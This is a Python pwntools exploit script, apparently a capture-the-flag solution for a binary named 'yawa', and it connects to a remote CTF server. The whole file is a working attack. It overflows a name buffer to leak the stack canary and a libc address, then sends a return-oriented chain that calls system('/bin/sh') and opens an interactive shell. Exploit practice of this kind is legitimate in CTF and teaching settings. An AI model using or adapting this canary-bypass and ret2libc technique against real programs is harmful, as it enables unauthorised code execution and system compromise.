from pwn import *
from icecream import ic

elf = exe = ELF("./yawa_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("2024.ductf.dev", 30010)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x00000000000012fa
pie b 0x000000000000131d
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def name_change(newname):
    sla(b'>', b'1')
    s(newname)

def get_leak():
    sla(b'>', b'2')
    ru(b'b')

name_change(b'a'*0x58+b'b')
get_leak()
canary = u64(re(7).rjust(8, b'\x00'))
ic(hex(canary))

name_change(b'a'*0x67+b'b')
get_leak()
libc.address = u64(re(6).ljust(8, b'\x00')) - 171408
ic(hex(libc.address))

pop_rdi = libc.address + 0x000000000002a3e5
binsh = libc.address + 0x1d8678
ret = libc.address + 0x00000000000f8c92
system = libc.sym['system']

payload = b'a'*0x58
payload += p64(canary)
payload += b'a'*0x8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)

name_change(payload)
sla(b'>', b'3')

io.interactive()
